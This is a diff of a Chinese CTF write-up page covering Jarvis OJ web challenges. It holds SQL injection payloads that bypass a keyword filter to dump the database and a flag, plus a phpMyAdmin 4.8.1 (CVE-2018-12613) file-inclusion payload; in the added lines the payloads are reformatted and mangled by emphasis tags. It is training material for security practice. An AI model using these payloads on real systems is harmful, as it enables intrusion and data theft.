@@ -259,15 +259,16 @@ webre<span class="token punctuation">(</span><span class="token punctuation">)</
 <p>说明字段为3</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image">
 
-<p>双写绕过对select和union的过滤<br>数据库名</p>
-<pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p>
+<p>双写绕过对select和union的过滤<br>数据库名<br>$$<br>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,database()<br>$$<br>查到数据库名是test</p>
 <p>表名</p>
-<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">
+<p>$$<br>id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(table_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.tables/<em>22</em>/where/<em>22</em>/table_schema=database()<br>$$</p>
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">
 
 <p>列名</p>
-<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p>
+<p>$$<br>id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(column_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.columns/<em>22</em>/where/<em>22</em>/table_schema=database()/<em>22</em>/and/<em>22</em>/table_name=0x636f6e74656e74<br>$$<br>查出来是id,context,title</p>
 <p>读文件</p>
-<pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
+<p>$$<br>id=-1/<em>22</em>/uniunionon/<em>22</em>/seleselectct/<em>22</em>/1,2,context/<em>22</em>/frofromm/<em>22</em>/content<br>$$</p>
+<p>得到flag</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image">
 
 
@@ -358,9 +359,8 @@ webre<span class="token punctuation">(</span><span class="token punctuation">)</
         <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>  
 <span class="token delimiter">?></span></code></pre>
-<p>hint.php</p>
-<pre class=" language-PHP"><code class="language-PHP">flag not here, and flag in ffffllllaaaagggg</code></pre>
-<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:<br><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code><br>传入得到flag</p>
+<p>hint.php<br>$$<br>flag not here, and flag in ffffllllaaaagggg<br>$$</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:<br>$$<br>?file=hint.php%253f/../../../../ffffllllaaaagggg<br>$$<br>传入得到flag</p>
 <p>具体为啥这么构造，参考下面的漏洞。</p>
 <h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p>
 <h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p>
